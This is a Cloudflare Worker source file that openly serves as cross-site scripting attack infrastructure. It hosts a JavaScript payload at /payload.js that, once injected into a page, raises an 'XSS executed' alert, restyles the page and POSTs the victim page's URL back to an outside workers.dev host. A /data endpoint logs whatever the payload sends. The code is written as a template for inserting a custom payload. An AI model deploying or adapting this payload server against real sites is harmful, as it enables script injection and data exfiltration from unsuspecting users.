export default {
  async fetch(request, env, ctx) {
    const url = new URL(request.url);
    
    // Handle CORS preflight requests
    if (request.method === "OPTIONS") {
      return new Response(null, {
        headers: {
          "Access-Control-Allow-Origin": "*",
          "Access-Control-Allow-Methods": "GET, POST, PUT, DELETE, OPTIONS",
          "Access-Control-Allow-Headers": "*",
          "Access-Control-Max-Age": "86400",
        },
      });
    }

    // Serve JavaScript payload
    if (url.pathname === "/payload.js") {
      const jsPayload = `
        // Your custom JavaScript payload here
        console.log("Custom script loaded successfully!");
        
        // Example: Change page background
        document.body.style.background = "linear-gradient(45deg, #ff6b6b, #4ecdc4)";
        
        // Example: Show alert with current URL
        alert("XSS executed on: " + window.location.href);
        
        // Example: Send data back to your worker
        fetch('https://worker.mobzillafaceyt.workers.dev/data', {
          method: 'POST',
          headers: {'Content-Type': 'application/json'},
          body: JSON.stringify({
            message: "Script executed successfully",
            url: window.location.href,
            timestamp: new Date().toISOString()
          })
        });
      `;

      return new Response(jsPayload, {
        headers: {
          "Access-Control-Allow-Origin": "*",
          "Content-Type": "application/javascript",
          "Cache-Control": "no-cache",
        },
      });
    }

    // Handle data endpoint
    if (url.pathname === "/data" && request.method === "POST") {
      const data = await request.json();
      console.log("Received data from payload:", data);
      
      return new Response("Data received", {
        headers: {
          "Access-Control-Allow-Origin": "*",
          "Content-Type": "text/plain",
        },
      });
    }

    // Default response
    console.log("XSS payload triggered:", new Date().toISOString());
    return new Response("XSS request received successfully", {
      status: 200,
      headers: {
        "Access-Control-Allow-Origin": "*",
        "Content-Type": "text/plain",
      },
    });
  },
};
